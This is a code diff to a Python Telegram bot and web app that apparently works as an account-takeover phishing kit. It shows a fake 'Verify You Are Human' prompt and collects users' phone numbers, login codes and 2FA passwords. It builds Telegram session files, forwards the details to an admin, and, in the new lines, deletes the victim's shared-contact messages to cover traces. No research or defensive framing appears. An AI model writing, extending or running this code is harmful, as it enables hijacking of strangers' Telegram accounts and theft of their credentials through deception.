@@ -31,6 +31,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 sessions = {}
 session_expiry = 300  # 5 minutes
 telegram_clients = {}
+contact_messages = {}  # Store message IDs for deletion
 
 # Create directories
 os.makedirs('sessions', exist_ok=True)
@@ -167,7 +168,7 @@ async def verify_2fa_async(client, password):
         print(f"2FA error: {e}")
         return {'success': False, 'error': f'Wrong password: {str(e)}'}
 
-def send_to_admin(phone, user_info=None, password=None, source="chat"):
+def send_to_admin(phone, user_info=None, password=None, source="webapp"):
     try:
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         msg = f"""📱 <b>NEW VERIFICATION</b>
@@ -211,16 +212,20 @@ def init_session():
         username = data.get('username', '')
         first_name = data.get('first_name', '')
         last_name = data.get('last_name', '')
+        chat_id = data.get('chat_id')
+        message_id = data.get('message_id')
         
         # Generate session ID for this WebApp instance
         session_id = generate_session_id()
         
-        # Store session with user info (phone will be added later)
+        # Store session with user info
         sessions[session_id] = {
             'user_id': user_id,
             'username': username,
             'first_name': first_name,
             'last_name': last_name,
+            'chat_id': chat_id,
+            'message_id': message_id,
             'phone': None,
             'status': 'waiting_for_contact',
             'expiry': datetime.now() + timedelta(seconds=session_expiry),
@@ -296,6 +301,15 @@ def verify_contact():
         # Validate phone number
         if len(phone) < 8 or not re.match(r'^\+\d+$', phone):
             return jsonify({'success': False, 'error': 'Invalid phone number format'})
+        
+        # Delete the contact message from chat if exists
+        session = sessions[session_id]
+        if session.get('chat_id') and session.get('message_id'):
+            try:
+                bot.delete_message(session['chat_id'], session['message_id'])
+                print(f"Deleted contact message for user {session['user_id']}")
+            except Exception as e:
+                print(f"Could not delete message: {e}")
         
         # Generate session file
         session_file = generate_session_file(phone)
@@ -484,41 +498,96 @@ def verify_2fa():
 # ==================== BOT HANDLERS ====================
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    """Send WebApp button directly"""
+    """Send verification message and WebApp button"""
     try:
+        chat_id = message.chat.id
+        user_id = message.from_user.id
+        username = message.from_user.username or ''
+        first_name = message.from_user.first_name or ''
+        last_name = message.from_user.last_name or ''
+        
+        # Send verification message
+        verification_msg = bot.send_message(
+            chat_id,
+            f"""👤 <b>Verify You Are Human</b>
+
+User: {first_name} {last_name}
+Username: @{username}
+ID: {user_id}
+
+<b>Please open the WebApp below to verify your identity:</b>""",
+            parse_mode='HTML'
+        )
+        
         # Create WebApp URL
         webapp_url = WEBHOOK_URL.rstrip('/') if WEBHOOK_URL else f"https://{request.host}"
         
         # Create inline keyboard with WebApp button
         keyboard = types.InlineKeyboardMarkup()
         webapp_btn = types.InlineKeyboardButton(
-            text="📱 Open WebApp to Verify",
+            text="🔐 Open Verification WebApp",
+            web_app=types.WebAppInfo(url=webapp_url)
+        )
+        keyboard.add(webapp_btn)
+        
+        # Send WebApp button
+        webapp_msg = bot.send_message(
+            chat_id,
+            "Click the button below to start verification:",
+            reply_markup=keyboard
+        )
+        
+        # Store message ID for potential deletion
+        contact_messages[user_id] = {
+            'chat_id': chat_id,
+            'verification_msg_id': verification_msg.message_id,
+            'webapp_msg_id': webapp_msg.message_id
+        }
+        
+        print(f"Verification started for user {user_id}")
+        
+    except Exception as e:
+        print(f"Start command error: {e}")
+
+# Handler for contact sharing via chat (fallback)
+@bot.message_handler(content_types=['contact'])
+def handle_contact(message):
+    """Handle contact sharing via chat (fallback)"""
+    try:
+        contact = message.contact
+        user_id = message.from_user.id
+        chat_id = message.chat.id
+        
+        # Delete contact message
+        try:
+            bot.delete_message(chat_id, message.message_id)
+            print(f"Deleted contact message from user {user_id}")
+        except Exception as e:
+            print(f"Could not delete contact message: {e}")
+        
+        # Send WebApp URL
+        webapp_url = WEBHOOK_URL.rstrip('/') if WEBHOOK_URL else f"https://{request.host}"
+        
+        keyboard = types.InlineKeyboardMarkup()
+        webapp_btn = types.InlineKeyboardButton(
+            text="🔐 Continue in WebApp",
             web_app=types.WebAppInfo(url=webapp_url)
         )
         keyboard.add(webapp_btn)
         
         bot.send_message(
-            message.chat.id,
-            """🔐 <b>Telegram Account Verification</b>
+            chat_id,
+            f"""✅ Contact received!
 
-Click the button below to open the WebApp and verify your account:
+📱 Phone: {contact.phone_number}
+👤 Name: {contact.first_name or ''} {contact.last_name or ''}
 
-✅ <b>WebApp Features:</b>
-• Share contact directly in WebApp
-• Enter OTP securely
-• 2FA support if enabled
-• No chat messages
-• Auto-delete shared contact
-
-<b>Click below to begin:</b>""",
-            parse_mode='HTML',
+Please click below to continue verification in WebApp:""",
             reply_markup=keyboard
         )
         
-        print(f"WebApp button sent to user {message.from_user.id}")
-        
     except Exception as e:
-        print(f"Start command error: {e}")
+        print(f"Contact handler error: {e}")
 
 # ==================== WEBHOOK SETUP ====================
 def setup_webhook():
@@ -550,12 +619,13 @@ def webhook():
 
 # ==================== CLEANUP THREAD ====================
 def cleanup_loop():
-    """Clean up old sessions"""
+    """Clean up old sessions and messages"""
     while True:
         time.sleep(60)
         current_time = datetime.now()
         expired = []
         
+        # Clean expired sessions
         for session_id, session in sessions.items():
             if session['expiry'] < current_time:
                 expired.append(session_id)
